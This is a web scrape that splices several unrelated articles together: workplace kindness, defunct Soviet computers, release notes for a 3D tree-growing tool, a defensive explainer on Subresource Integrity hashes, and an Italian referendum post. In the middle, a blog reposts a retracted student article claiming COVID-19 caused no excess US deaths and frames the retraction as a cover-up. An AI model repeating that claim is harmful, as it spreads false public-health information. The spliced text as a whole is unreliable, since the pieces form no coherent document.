<p>In a <a href="https://hbr.org/2013/01/the-price-of-incivility" target="_blank" rel="noopener">2013 article</a> published in Harvard Business Review, Christine Porath said her work shows that teams that work in an environment where rudeness, bullying, demeaning comments, and insults are commonplace usually become fractured. People lose confidence, have low levels of trust, and become less helpful. Bad behavior, she adds, destroys collaboration, is harmful to mental health, and has been proven to be a significant barrier to efficiency.</p>
<p>Forbes argues that <a href="https://www.forbes.com/sites/ellevate/2018/03/06/science-proves-kindness-is-your-competitive-advantage/" target="_blank" rel="noopener">kindness is a competitive advantage</a>. I hope it becomes the standard. In a <a href="https://peakon.com/heartbeat/reports/the-employee-voice/" target="_blank" rel="noopener">study, Peakon found</a> that their coworkers were the 4th item most employees would like to change – right after salary, communication, and management.</p>
<blockquote><p>Kindness helps your peers feel safe, and if they feel safe people take the risks that enable efficient, honest communication and thus real collaboration.</p></blockquote>
<h2>What is kindness?</h2>
<p>Kindness is showing interest in your peers’ wellbeing; this goes from simply asking them how their weekend went to remembering they had a hard time with something two weeks ago and following up on that. It’s really these simple, everyday things, but doing them consistently.</p>
<p>Kindness is understanding that we all struggle sometimes.</p>
<p>A form of kindness is when faced with a frustrating situation, we don’t assume malice. Instead, we assume good intentions and reach out to clarify.</p>
<p>One key to kindness is empathy – being able to relate to others, understanding how they feel. There are three kinds of empathy:</p>
<h3>Cognitive empathy</h3>
<p>Cognitive empathy is about thought as much as emotion. It is knowing, understanding, or comprehending on an intellectual level. Knowing how the other person feels and what they might be thinking. This is crucial, but often not enough since you still can be disconnected from or ignore deeper emotions; it doesn’t put you in another’s shoes in a felt sense. Understanding sadness is not the same thing as feeling sad.</p>
<p>Yet, without this, we can’t even talk about understanding others.</p>
<h3>Emotional empathy</h3>
<p>Emotional Empathy, just like it sounds, involves directly feeling the emotions that the other person is feeling. It is actually very “biological”, it’s deeply rooted in our so-called <a href="https://www.apa.org/monitor/oct05/mirror" target="_blank" rel="noopener">mirror neurons</a>. Sometimes this helps the other person (“misery loves company”) but it can easily backfire if you yourself lack the ability to manage distressing emotions. It can really help in forming a connection, though – as it conveys the message “wow, this person really understands me and cares for me”. Just remember, put on your own oxygen mask before helping others.</p>
<h3>Compassionate empathy</h3>
<p>Compassionate Empathy strikes a powerful balance of the two other kinds above by relying on your <strong>emotional intelligence</strong> to effectively respond to the situation with a loving detachment.</p>
<p>It honors the natural connection by considering both the felt senses and intellectual situation of the person without losing yourself in the situation. Thus, it enables you to naturally act in the other person’s interest (vs. passively observing or losing yourself to distressing emotions).</p>
<p>Compassionate empathy is the kind that’s useful in most situations.</p>

<p>Remember that I said kindness doesn’t depend on levels? Well, there’s one nuance – the more your perceived power and authority shifts as you level up, the more aware you need to be to practice active kindness. Most people will get less engaged and even demotivated when working with someone cold in power. Another reason is that people look at you for leadership, and your behavior will get copied, so you’re responsible for leading by example.</p>
<h2>Why is kindness not trivial?</h2>
<p>The main reason is that we bring our personal fears, insecurities, expectations, and context to work. Interestingly, the more skilled your team is, the harder it can get!</p>
<p>We all have a unique background, and not everyone has the same experience that we have. It can be surprising when you encounter someone that hasn’t worked with the technology that you have (“What do you mean you don’t know what a monad is?”). We often forget that the job is not to show how smart we are.</p>
<p>We all have bad days in a bad mood. On days like this, it can take a lot of work for us to come across as kind persons (and it’s all right, you should also receive kindness).</p>
<p>Communication is hard, each message goes through multiple filters by the time it gets to the recipient. Such filters are your tone, body language, phrasing the recipient’s mental and emotional state, their expectations in the situation, cultural and social conditioning. We think we’ve said what we meant to say, but the message easily gets distorted by these filters, e.g. turning a neutral sentence into an attack (“Can I help you?” –&gt; “I don’t trust you can do your job”).</p>
<h2>Low hanging fruits of kindness for software engineers</h2>
<p>Here is a list of things you can start with right now:</p>
<ul><li><strong>Be patient with career starters</strong>. Being a junior developer is very difficult. Provide them a safe space where they can fail and be instructed, with kindness, about how to prevent the mistake again. Proactively reach out and mentor them.</li><li><strong>Do not mock someone for their chosen language or framework</strong>.</li><li><strong>Show forgiveness when something breaks</strong>. Outages suck, but even if you can trace it back to a stupid human error, you can’t imagine how that person could have made it; remember that this just shows the system’s weakness and the processes around it. We all make mistakes. Please don’t make it personal.</li><li><strong>Celebrate victories, even small ones</strong>.</li><li><strong>Use inclusive language</strong>. You’ll be surprised how bad we are at this, intrinsically. </li><li><strong>Learn about body language and understand your default modes there.</strong></li><li><strong>Manage your stress (know your limits, make sure you rest and recharge)</strong></li><li><strong>Be a compassionate code reviewer, not a critic.</strong></li><li><strong>Use humor. Then use some more. </strong>Good for you and good for your environment.</li><li><strong>In frustrating situations, assume goodwill, not malice. </strong>See <a href="https://en.wikipedia.org/wiki/Hanlon%27s_razor" target="_blank" rel="noopener">Hanlon’s razor</a>.</li><li><strong>Smile</strong>!</li><li><strong>Thank people for their help publicly.</strong></li></ul>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div itemprop="articleBody"><p>The building did not stand out. Unremarkable industrial building, which was built in hundreds of Soviet cities.<span id="more-10215"></span></p>
<p>Non-broken glass, burning lights, live plants inside, modern plastic entrance doors. Except for one floor.</p>
<!-- WP QUADS Content Ad Plugin v. 2.0.17.1 -->


<p>Despite the twilight, the floor remained lifelessly dark. Somewhere in the depths, there was a dim glow of electric light, hardly penetrating through old glass blocks.</p>
<p>Inside the floor was empty and black, but not completely.&nbsp;Inside burned several fluorescent lamps, spotlighting dozens of silhouettes of tall cabinets.</p>
<p>Some of them were covered with darkened translucent film.</p>
<p>The surface of the floor, tables and enclosures covered with black spots of soot, sometimes diluted with white stains of dried extinguishing mixture.</p>
<p>The air felt a persistent, but not strong smell of burning.&nbsp;The fire walked here a few years ago but did not touch the equipment.</p>
<p>Part of the cabinets were antique electronic computers. Others served to measure signals, and computers controlled this process. Dozens of terminals froze on the tables with extinct screens.</p>

<p>Suddenly it became clear that before them the legendary machine “Saratov-2”.&nbsp;The machine, which was massively placed on many enterprises of the Soviet Union in the 70s, but at the same time, not a single high-quality (I’m not talking about color) photos remained. Not on the Internet, not even in the museum of the enterprise developer.</p>

<p>This computer did not even have a traditional microprocessor. Domestic clone of the popular American PDP-8, Saratov-2 was produced in two versions.</p>
<p>Steel frame, like a chest of drawers, filled with drawers.&nbsp;Different boxes responded to various computer nodes — a twelve-bit computing unit, input-output device interfaces, and RAM.</p>
<p>The memory was ferromagnetic – two boxes of four cubes in each. Reading or writing programs occurred through punched tapes, and to display the results of calculations used electric typewriter CONSUL-260.</p>
<p>The monitor and keyboard in that era were not yet a much-needed</p>
<p>part of the computer. The necessary input of programs into the operative memory was carried out in binary codes, manually using a group of switches on the front panel. Bulbs controlled the correctness of the input.</p>

<p>The next generation of computers was Electronics 100/25. These machines were clones of American PDP-11.</p>
<p>They thought faster, had more memory, allowed them to work with magnetic tape drives and punched tapes, but the general principle remained the same.</p>
<p>It was possible to connect a monitor and a keyboard to this computer, while still having the ability to enter programs through the front switches.</p>

<p>Electronics-60 – the further development of Electronics 100/25. The same architecture, but bulky tape drives are a thing of the past.</p>
<p>They were replaced by flexible eight-inch floppy disks. The new chipset, allowed to fit the processor module, power supply and control devices, in a very compact size.</p>
<p>I note that all these computers were managers, that is, they worked with a bunch of external equipment. It could be machine tools, laboratory complexes, measuring devices.</p>

<p>15VM16-1 some early version of Electronics-60, having a control panel of light bulbs and switches. Assembled on the element base of the previous Electronics 100/25. I occupied a small nightstand built into the table on which the controlled equipment was placed.</p>

<p>DVK-2M or Interactive Computing Complex. Massive, stylish in appearance, the computer of the 80s, which could be considered a personal computer.</p>
<p>It consisted of two desktop blocks – processor and pairing. A set of interchangeable interface cards allowed connecting drives of various types, a monochrome monitor on an openwork leg, and a keyboard.</p>
<p>Back in 1993, when we were studying, one teaching DVK could distribute programs for a couple of dozen Spectrums through the network.</p>

                                                                                <p>Johns Hopkins published this study on Sunday which posits that Covid is nowhere near the disaster we're being told it is. I would summarize it for you or offer pull-quotes but honestly you just have to read it yourself because it's mind-blowing. <a target="_blank" href="https://www.jhunewsletter.com/article/2020/11/a-closer-look-at-u-s-deaths-due-to-covid-19">The original article</a> is now deleted from the Johns Hopkins website ... for some reason. Luckily the internet is forever and it's available via<a target="_blank" href="https://web.archive.org/web/20201126223119/https://www.jhunewsletter.com/article/2020/11/a-closer-look-at-u-s-deaths-due-to-covid-19"> the Wayback Machine</a>. Here is the article in its entirety:</p><p>* * *</p><p>According to <a target="_blank" href="https://web.archive.org/web/20201126223119/https://www.theguardian.com/world/2020/nov/21/covid-world-map-which-countries-have-the-most-coronavirus-cases-and-deaths">new data</a>, the U.S. currently ranks first in total COVID-19 cases, new cases per day and deaths. Genevieve Briand, assistant program director of the Applied Economics master's degree program at Hopkins, critically analyzed the effect of COVID-19 on U.S. deaths using data from the Centers for Disease Control and Prevention (CDC) in her webinar titled "COVID-19 Deaths: A Look at U.S. Data."</p><p>From mid-March to mid-September, U.S. total deaths have reached 1.7 million, of which 200,000, or 12% of total deaths, are COVID-19-related. Instead of looking directly at COVID-19 deaths, Briand focused on total deaths per age group and per cause of death in the U.S. and used this information to shed light on the effects of COVID-19.</p><p>She explained that the significance of COVID-19 on U.S. deaths can be fully understood only through comparison to the number of total deaths in the United States.</p><p>After retrieving data on the CDC website, Briand compiled a graph representing percentages of total deaths per age category from early February to early September, which includes the period from before COVID-19 was detected in the U.S. to after infection rates soared.</p><p>Surprisingly, the deaths of older people stayed the same before and after COVID-19. Since COVID-19 mainly affects the elderly, experts expected an increase in the percentage of deaths in older age groups. However, this increase is not seen from the CDC data. In fact, the percentages of deaths among all age groups remain relatively the same.</p><p>"The reason we have a higher number of reported COVID-19 deaths among older individuals than younger individuals is simply because every day in the U.S. older individuals die in higher numbers than younger individuals," Briand said.</p><p>Briand also noted that 50,000 to 70,000 deaths are seen both before and after COVID-19, indicating that this number of deaths was normal long before COVID-19 emerged. Therefore, according to Briand, not only has COVID-19 had no effect on the percentage of deaths of older people, but it has also not increased the total number of deaths.</p><p>These data analyses suggest that in contrast to most people's assumptions, the number of deaths by COVID-19 is not alarming. In fact, it has relatively no effect on deaths in the United States.</p><p>This comes as a shock to many people. How is it that the data lie so far from our perception?</p><p>To answer that question, Briand shifted her focus to the deaths per causes ranging from 2014 to 2020. There is a sudden increase in deaths in 2020 due to COVID-19. This is no surprise because COVID-19 emerged in the U.S. in early 2020, and thus COVID-19-related deaths increased drastically afterward.</p><p>Analysis of deaths per cause in 2018 revealed that the pattern of seasonal increase in the total number of deaths is a result of the rise in deaths by all causes, with the top three being heart disease, respiratory diseases, influenza and pneumonia.</p><p>"This is true every year. Every year in the U.S. when we observe the seasonal ups and downs, we have an increase of deaths due to all causes," Briand pointed out.</p><p>When Briand looked at the 2020 data during that seasonal period, COVID-19-related deaths exceeded deaths from heart diseases. This was highly unusual since heart disease has always prevailed as the leading cause of deaths. However, when taking a closer look at the death numbers, she noted something strange. As Briand compared the number of deaths per cause during that period in 2020 to 2018, she noticed that instead of the expected drastic increase across all causes, there was a significant decrease in deaths due to heart disease. Even more surprising, as seen in the graph below, this sudden decline in deaths is observed for all other causes.</p><mediatag id="57319"></mediatag><p><i>Graph depicts the number of deaths per cause during that period in 2020 to 2018.</i></p><p>This trend is completely contrary to the pattern observed in all previous years. Interestingly, as depicted in the table below, the total decrease in deaths by other causes almost exactly equals the increase in deaths by COVID-19. This suggests, according to Briand, that the COVID-19 death toll is misleading. Briand believes that deaths due to heart diseases, respiratory diseases, influenza and pneumonia may instead be recategorized as being due to COVID-19.</p><mediatag id="57320"></mediatag><p><i>Graph depicts the total decrease in deaths by various causes, including COVID-19.</i></p><p>The CDC classified all deaths that are related to COVID-19 simply as COVID-19 deaths. Even patients dying from other underlying diseases but are infected with COVID-19 count as COVID-19 deaths. This is likely the main explanation as to why COVID-19 deaths drastically increased while deaths by all other diseases experienced a significant decrease.</p><p>"All of this points to no evidence that COVID-19 created any excess deaths. Total death numbers are not above normal death numbers. We found no evidence to the contrary," Briand concluded.</p><p>In an interview with <i>The News-Letter</i>, Briand addressed the question of whether COVID-19 deaths can be called misleading since the infection might have exacerbated and even led to deaths by other underlying diseases.</p><p>"If [the COVID-19 death toll] was not misleading at all, what we should have observed is an increased number of heart attacks and increased COVID-19 numbers. But a decreased number of heart attacks and all the other death causes doesn't give us a choice but to point to some misclassification," Briand replied.</p><p>In other words, the effect of COVID-19 on deaths in the U.S. is considered problematic only when it increases the total number of deaths or the true death burden by a significant amount in addition to the expected deaths by other causes. Since the crude number of total deaths by all causes before and after COVID-19 has stayed the same, one can hardly say, in Briand's view, that COVID-19 deaths are concerning.</p><p>Briand also mentioned that more research and data are needed to truly decipher the effect of COVID-19 on deaths in the United States.</p><p>Throughout the talk, Briand constantly emphasized that although COVID-19 is a serious national and global problem, she also stressed that society should never lose focus of the bigger picture — death in general.</p><p>The death of a loved one, from COVID-19 or from other causes, is always tragic, Briand explained. Each life is equally important and we should be reminded that even during a global pandemic we should not forget about the tragic loss of lives from other causes.</p><p>According to Briand, the over-exaggeration of the COVID-19 death number may be due to the constant emphasis on COVID-19-related deaths and the habitual overlooking of deaths by other natural causes in society.</p><p>During an interview with <i>The</i> <i>News-Letter </i>after the event, Poorna Dharmasena, a master's candidate in Applied Economics, expressed his opinion about Briand's concluding remarks.</p><p>"At the end of the day, it's still a deadly virus. And over-exaggeration or not, to a certain degree, is irrelevant," Dharmasena said.</p><p>When asked whether the public should be informed about this exaggeration in death numbers, Dharmasena stated that people have a right to know the truth. However, COVID-19 should still continuously be treated as a deadly disease to safeguard the vulnerable population.</p><p>* * *</p><p>Facebook and Twitter will certainly block this article within hours of its publication. Just like Johns Hopkins deleted it from its site. The question is ... why?</p><mediatag id="57334"></mediatag><mediatag id="57329"></mediatag><mediatag id="57331"></mediatag><mediatag id="57332"></mediatag><p>* * *</p><p><strong>UPDATE</strong>: JHU tweeted that they deleted the article because it "was being used to support false and dangerous inaccuracies about the impact of the pandemic."</p><mediatag id="57420"></mediatag><p>Importantly, they didn't say anything in the article was incorrect. So we're just memory-holing studies that don't align with the narrative? Got it.</p>

<p><em>The past year I’ve been exploring a number of theories that will benefit the growth algorithm in exciting, and surprising ways. These ideas are slowly but surely crystallizing into a coherent release, but it takes time to perfect. Because of that, I’ve been working in parallel on this release here, one that doesn’t touch the algorithm at all. It instead improves the end result, the actual tree models, and on fun tools to manipulate them!</em></p><p><em>A big effort was made to take the tree models to the next level. Better mesh quality with smoother transitions, better UV maps and a welcome speed boost. And the freedom of adding as many different twig models as you like. But let’s start with the bend tool… Have fun growing!</em></p>

<h2>Bend Tool</h2>
<p><img loading="lazy" src="https://www.thegrove3d.com/wp-content/uploads/2020/04/BendTool.jpg" alt="" width="1280" height="528"></p>
<div>
<div><p>
This fun new tool is inspired by the Bonsai technique of wiring and bending branches. After wrapping a branch in metal wire, you can then bend the branch into a pleasing curve. Several months of growth will solidify the tension in the branch, and the wire can be removed.</p>
<p>This allows you to realign branches and make them grow in the direction you want them to – it literally adds a lot of flexibility. Quite a bit more flexibility than realistically possible – you can bend any branch regardless of its thickness without the fear of snapping. So while the bonsai technique is limited to small trees, you can now apply the same principles to shape full grown hero trees.</p>
<p>The tool adds a new level of interactivity to The Grove. It starts by selecting a branch node. Hovering your mouse will highlight the thickest branch node close to the mouse. Left click to select, then whirl your mouse around that point to adjust the angle. Use the scroll wheel to adjust the radius of the bend.</p>
</div>
<div>
<h3>Curves</h3>
<p>There are 3 different curves for the bend tool. Each creates a different shape along the bend. <em>Automatic</em> is a simple curve that gives a natural bend. Press tab to switch to the <em>Flexible</em> curve. Now you can increase the curvature along the length of the bend by moving the mouse closer to the origin of the bend. And then there’s a third curve that you can access by again pressing tab. The <em>S-curve</em> blends from a simple bend to a curling snake when you increase the angle.</p>
</div>
</div>


<h2>Twigs, twigs, twigs…</h2>
<p><em>The Grove uses two types of twigs – side twigs and the often longer end twigs. This gives enough variation for many types of trees, with minimal visible repetition. It’s surprising that – on many trees – we could get away with just two twigs. But there are just as many trees that need more variation – trees with more distinct visual features.</em></p>
<div>
<div>
<p><img loading="lazy" src="https://www.thegrove3d.com/wp-content/uploads/2020/03/DeadTwigsSmall.jpg" alt="" width="1280" height="528"></p>
<h3>Dead Twig</h3>
<p>While before dead branches were bare, you can now use a special twig to add more detail to the weaker parts of a tree, mostly the lower crown. A dead twig can simply be the same twig stripped of leaves, or it could be a twig with wilted or dry brown leaves. On a pine tree it can still hang on to several browned needles, curled up by drought.</p>
<p>Dead twigs appear on dead branches and they stay there for the number of years that you specify with the <em>Wither</em> parameter.</p>
<h3>Upward Twig</h3>
<p>An optional twig object that that overrides the end twig when it’s growing steeply upward. Vertical twigs are often more powerful and even longer, and the leaves are arranged differently, so that they enjoy most of the sun. When a twig is growing nearly vertical, leaves start twisting around the branch while each one is facing up to the sky.</p>
<p>If no upward twig is set, it will use the same object that is set for the end twig. It’s completely optional. I intend start adding upward twigs to existing twig models soon.</p>
</div>
<div>
<h3>Twig Collections</h3>
<p>Instead of duplicating just a single end twig, and just a single side twig, entire collections of twig variations can now be used. Pick a collection and the objects in it will be randomly picked for each duplicate.</p>
<p>External twig files now also support this. Here’s how to correctly structure a *.blend file to be used as a twig, for listing in the twigs menu. It’s the same as a normal twig, but then put your twig models in collections and add ‘sidetwig’, ‘endtwig’, ‘upward’ or ‘dead’ in the name of the collections.</p>
<p><img loading="lazy" src="https://www.thegrove3d.com/wp-content/uploads/2020/04/TwigCollections2.jpg" alt="" width="1280" height="528"></p>
<p>Now that there’s much more variation in twigs, with collections, upward twigs and dead twigs, it’s time to tidy up. Appended twigs are now neatly joined in their own collections inside the twigs collection.</p>
<h3>Existing Twigs</h3>
<p>Existing twigs do not (yet) have the new variations for upward and dead twigs, I’m working on that. For now it’s pretty simple to add for instance an upward twig. Open the twig file and duplicate the end (apical) twig. Change its name, remove ‘apical’ from the name and instead add ‘upward’. Then temporarily rotate the twig to point up. Use Blender’s modeling tools to bend and rotate the leaves into positions that don’t defy gravity. Then when you’re done making changes, rotate the twig back to the original direction pointing right and save the file.</p>
<p>More twigs are underway and they will be rich with variations!</p>
</div>
</div>


<h2>Better mesh building</h2>
<p><img loading="lazy" src="https://www.thegrove3d.com/wp-content/uploads/2020/04/BuildImprovementsB1.jpg" alt="" width="1280" height="528"></p>
<div>
<div>
<h3>Twist Fix</h3>
<p>I finally fixed the sudden twists that would sometimes show up when building branches, especially on dangling branches and branches that make strange turns. With the new bend tool, these types of branches are far more common and so this problem really needed to be fixed!</p>
<p><img loading="lazy" src="https://www.thegrove3d.com/wp-content/uploads/2020/04/Twist2.jpg" alt="" width="1280" height="528"></p>
<p><em>Smoothly interpolated twisting along the length of the branch, no matter how crazy the twists or turns may be.</em></p>
<h3>Smooth taper</h3>
<p>I added something extra to remedy sudden steps down in thickness along the same branch. It detects an extreme decrease in radius, and then looks ahead one node further – and if that node has a much smaller decrease, it will smooth the branch for a natural taper.</p>
<h3>Side takeover</h3>
<p>When a side branch grows stronger than its parent branch, it becomes the new lead. This can create a sudden kink in the branch caused by the initial angle of the side branch. In nature this angle will be filled up by new growth to form a smooth transition. In an earlier release, I already tackled this problem, but I was adding an extra node to create a smooth transition. But it turned out that this extra node could cause problems when the branch gets thicker – the small internode length combined with the sudden angle could create ugly geometry instead of the desired smoothing. Especially when two branches continue battling for dominance, and the smoothing is applied multiple times, from one branch to the next!</p>
<p>So instead of adding an extra node, I’m now using the existing nodes and offset them to create a good transition. No matter how many times this smoothing is applied, it causes no problem.</p>
<h3>Angles</h3>
<p>Smoothing of sudden angles was a step in the simulation that was performed every year, ironing out the sudden angles along the length of branches. But the effect was too strong, so strong in fact that it almost completely nullified the effects of <em>Turn Random Pitch</em> and <em>Heading</em>. So now it’s a separate <em>Smooth</em> operator that you can find in the <em>Build</em> panel. It’s at your disposal when you want the smooth look, and you can even apply smoothing multiple times to increase the effect.</p>
</div>
<div>
<h3>Branch smoothing modulation</h3>
<p>The premise for smoothing at branching points is the formation of branch collars. These collars give the branch a fluid continuation into its lead branch. Along the way, I’ve improved this transition bit by bit. But I might have gone one step too far. The effect should only show up over time, when the branch grows thicker. If you look at young twigs, these just branch off at an acute angle, no smoothing whatsoever. So for this release, I’ve improved the branch smoothing to get stronger with thickness.</p>
<p><img loading="lazy" src="https://www.thegrove3d.com/wp-content/uploads/2020/04/SmoothingModulation.jpg" alt="" width="1280" height="528"></p>
<p><em>The improvement is two-fold. There’s now almost no smoothing on young branches, which will be the most visible difference. Second, basing the smoothness on thickness now allows to go much more extreme when the branch indeed does get very thick.</em></p>
<h3>Dissolve</h3>
<p>On thicker branches and trunks, nodes that are close together could cause ugly geometry when building the mesh. Dissolve fixes this. It’s done automatically each year, and improves the building of thick trunks by removing excess nodes. More distance between nodes reduces the chance of sudden kinks and improves the smoothness of the trunk.</p>
<h3>Faster</h3>
<p>Talking about mesh building, I optimized it to make it much faster. It turned out that adding data layers took more time than building the mesh itself. So the first easy step was to disable the Age and Dead layers by default. If you need them, you can add them.</p>
<p>Then I optimized the conversion to vertex colors, making that part twice as fast for each layer.</p>
<p>The (internal) branch index layers now build incredibly fast, which by itself shaves off almost half a seconds from building a mature tree. Together, these speed gains add up to a noticeably faster build.</p>
</div>
</div>


<h2>Improvements</h2>
<p><em>Release 9 incorporates changes that stem from your user input. By far, the two most asked questions were how to grow trees at specific spots, and how to make the main branches thicker. These two things have been made much easier.</em></p>
<div>
<div>
<h3>Plant</h3>
<p>A question I get often is how to grow multiple trees together, and from specific locations? You could do so by adding empty objects that mark the locations. It’s been there forever, but not many users knew about it.</p>
<p>To un-hide this feature, and hopefully make it used more often, The Grove now starts with an empty object at the scene origin. This has the same effect as before, but I’m hoping that the visible arrow will invite users to move it around and experiment.</p>
<p>You can duplicate it, delete it and point it in any direction of your liking. Then Restart or Regrow to grow from the new locations.</p>
<p><img loading="lazy" src="https://www.thegrove3d.com/wp-content/uploads/2020/03/Plant.jpg" alt="" width="1280" height="528"></p>
<p>I also added the <em>Plant</em> operator. It’s a simple button that adds an empty object to your grove collection. You can easily do the<br>
Same with <em>Add &gt; Empty &gt; Single Arrow</em>. But again, I’m trying to promote this feature. And there’s a little extra: repeatedly click<br>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div> <h2 id="security-problems-with-loading-scripts">Security problems with loading scripts</h2> <p>Whenever a site loads a Javascript via a <code>&lt;script&gt;</code> tag, it gives it free rein on the page. It can <strong>read and modify the contents, make HTTP requests, store and read some cookies, access the local storage and local databases</strong>, and can use all features that the page <a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Feature-Policy">has access to</a>.</p> <p>This is not a problem for scripts hosted on the same domain, but it gives the same <strong>enormous capabilities to scripts loaded from third-party websites</strong>.</p> <p>For example, you might want to host jquery on cdnjs instead of your own domain. This script tag loads the library code from the remote server:</p> <div><div><pre><code><span>&lt;script </span><span>src=</span><span>"https://cdnjs.cloudflare.com/ajax/libs/jquery/3.5.1/jquery.min.js"</span><span>&gt;&lt;/script&gt;</span>
</code></pre></div></div> <p>Checking the site shows that jquery is loaded, and adding a simple script tag is definitely an easier option to setting up some sort of dependency management. <strong>But how do you know that cdnjs will always send jquery unmodified in the future?</strong> It might choose to include some malware, for example, a cryptocurrency miner script, an attack called cryptojacking (there is a detailed article on how that works <a href="https://www.varonis.com/blog/cryptojacking/#mechanics">here</a>).</p> <p>This is not a theoretical problem. In 2018 a plugin called Browsealoud was <a href="https://www.theregister.com/2018/02/11/browsealoud_compromised_coinhive/">hacked</a> and <strong>its script that was loaded on a ton of websites started mining cryptocurrency for the hackers</strong>. In this case, it was only for direct financial gains, but the injected script could do a lot more damage.</p> <p>More recently, in 2020, Twilio suffered a <a href="https://www.twilio.com/blog/incident-report-taskrouter-js-sdk-july-2020">similar attack</a> where they left open their S3 bucket that hosted their script to be world-writable and somebody came and overwrote it. <strong>Every site that used that script was immediately compromised.</strong></p> <p> We write articles like this regularly. <a href="#" data-toggle="modal" data-target="#email-promo-popup">Join our mailing list</a> and let's keep in touch. </p> <h2 id="sri-hash">SRI hash</h2> <p>SRI (Subresource Integrity) is a feature that aims to solve this problem. It’s been available since mid-2015 and gained <a href="https://caniuse.com/subresource-integrity">universal support</a> in early 2019. It works by adding an <code>integrity</code> tag to the resource which the browser checks during the download.</p> <p>This is the jquery script with SRI added:</p> <div><div><pre><code><span>&lt;script
	</span><span>src=</span><span>"https://cdnjs.cloudflare.com/ajax/libs/jquery/3.5.1/jquery.min.js"</span>
	<span>integrity=</span><span>"sha512-bLT0Qm9VnAYZDflyKcBaQ2gg0hSYNQrJ8RilYldYQ1FxQYoCLtUjuuRuZo+fjqhx/qtq/1itJ0C2ejDxltZVFg=="</span>
	<span>crossorigin=</span><span>"anonymous"</span>
<span>&gt;&lt;/script&gt;</span>
</code></pre></div></div> <p>The <code>integrity</code> is the <em>hash of the content</em>. <strong>When the browser downloads the file, it checks if it matches the hardcoded value</strong> and rejects the script if not. As a result, if the file does not match the expected content, it won’t load and an error appears on the console:</p> <div><div><pre><code>Failed to find a valid digest in the 'integrity' attribute for resource
'https://cdnjs.cloudflare.com/ajax/libs/jquery/3.5.1/jquery.min.js' with
computed SHA-256 integrity '9/aliU8dGd2tb6OSsuzixeV4y/faTqgFtohetphbbj0='.
The resource has been blocked.
</code></pre></div></div> <p>Note that the reliability of your site is still tied to the CDN. If it is down or compromised, then the resource you need won’t load, possibly affecting functionality. SRI hashes only help with stopping the attack.</p> <h3 id="how-to-use-sri-hashes">How to use SRI hashes</h3> <p>Some CDNs, such as cdnjs automatically include the <code>integrity</code> attribute when you copy the script tag. This makes using it the default.</p> <p>If you need to generate the hash for a resource, <a href="https://www.srihash.org/">srihash.org</a> is an easy-to-use site. Just drop the URL, click “Hash!” and copy-paste the resulting tag.</p> <p>If you need to script it, use OpenSSL:</p> <div><div><pre><code>openssl dgst <span>-sha384</span> <span>-binary</span> FILENAME.js | openssl <span>base64</span> <span>-A</span>
</code></pre></div></div> <h2 id="the-problem-with-sri">The problem with SRI</h2> <p>In which cases you can’t use the <code>integrity</code> attribute? <strong>When the resource is not immutable, specifying the hash breaks when there is an update.</strong> For example, if you use Google Analytics, you are likely to use the <code>ga.js</code> or the <code>analytics.js</code> script to load it on the page. These are not versioned files, and Google updates them from time-to-time.</p> <p>While it’s possible to download the file and host it on your server, effectively freezing it in a version, it is actively <a href="https://support.google.com/analytics/answer/1032389?hl=en">discouraged</a> in the official documentation:</p> <blockquote> <p>While it’s possible to download the JavaScript file (gtag.js) to examine it, storing or serving the JavaScript file locally is not recommended.</p> <p>Referencing the JavaScript file from Google’s servers (i.e., https://www.googletagmanager.com/gtag/js) ensures that you get access to new features and product updates as they become available, giving you the most accurate data in your reports.</p> </blockquote> <p>And who doesn’t want new features and product updates as they become available?</p> <p>But the problem is not the lack of “new features” but the <strong>missing guarantee that the old version of the script <em>will work in the future</em></strong>. Since Google controls both the script and the analytics backend, <strong>it can make backward-incompatible changes</strong>. With jquery, it is guaranteed that a given version won’t change. With a script like <code>ga.js</code> and <code>analytics.js</code>, there is no such guarantee.</p> <p>And it’s not unique to Google. When you include the Facebook SDK, it also <a href="https://developers.facebook.com/docs/javascript/quickstart">needs you</a> to do it as a mutable file, as well as a ton of other service providers.</p> <p>These are similar problems to what <a href="https://advancedweb.hu/how-i-failed-to-implement-csp/">I experienced with CSP</a>, another security feature that gives websites more control over what the browser allows on the page.</p><div> <p> Related </p> <div> <p><a href="https://advancedweb.hu/how-i-failed-to-implement-csp/"> <img integrity="sha256-LgYXTHf1Wrht0a93R6nvOcTVFdimNNIN26qt3rhA9ME=" crossorigin="anonymous" src="https://advancedweb.hu/assets/6da855-479feb3d16093767c1b4814a38af651b48ebbb2a72f69ef7f5934c1ee23f0cfc.jpg"> </a> </p> <div>  <p> Lessons learned from adding Content Security Policy to a simple site </p> </div> </div> </div> <p>The solution?</p> <p>Unfortunately, there is none. If the provider does not provide an immutable, versioned file, you can’t do anything about it. Either way, you’ll introduce problems, either by potentially breaking functionality or by introducing supply-chain vulnerabilities.</p> <h2 id="conclusion">Conclusion</h2> <p>SRI is a powerful tool to prevent a very real problem. With a simple tag property, you can make sure that if you include scripts from other sites, even if those sites are compromised you won’t suffer a security incident.</p> <p>But unfortunately, this only works for immutable resources. When a script file is expected to change, you can’t pinpoint a fixed version. This makes SRI not possible in these cases.</p> </div></div>]]>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
        <p>In Italy, in the 20th and the 21st of September 2020, there will be a 
<a href="https://en.wikipedia.org/wiki/2020_Italian_constitutional_referendum">constitutional referendum</a>
to change the <a href="https://en.wikipedia.org/wiki/Constitution_of_Italy">Constitution of the Italian Republic</a> 
about the reduction of the number of eligible members of Parliament.
In particular, for the Chamber of Deputies from 630 to 400 components, and 
for the Senate from 315 to 200.</p>

<p>
  <a href="https://en.wikipedia.org/wiki/2020_Italian_constitutional_referendum">
    <img alt="Referendum." src="https://marcofavorito.me/assets/posts/visualize-referendum-changes/referendum.jpeg">
  </a>
</p>

<p>As you might expect, all the news and the media talked about it 
more or less incessantly in the few weeks before the voting days. 
However, most people don’t check <em>what</em> changed in the Constitution. 
Of course, it is not a particular issue in this specific case, since 
the changes are quite minimal, and a voter should be more interested 
into the consequences that a reform brings, rather than the actual words, 
that might be too technical to appreciate them. Nevertheless, 
I believe it should be good practice for the “modern citizen”.</p>

<p>I decided to improve the accessibility to the changes and, being a software engineer, 
my first thought was to use the most successful version control system: 
<a href="https://git-scm.com/">Git</a>. The process
of changing the text of the laws might be roughly mapped into 
the famous <a href="https://nvie.com/posts/a-successful-git-branching-model/">Git Workflow</a>:</p>
<ul>
  <li>on <code>master</code>, the current active version of the law;</li>
  <li>on other <code>branches</code>, the work-in-progress for specific topics;</li>
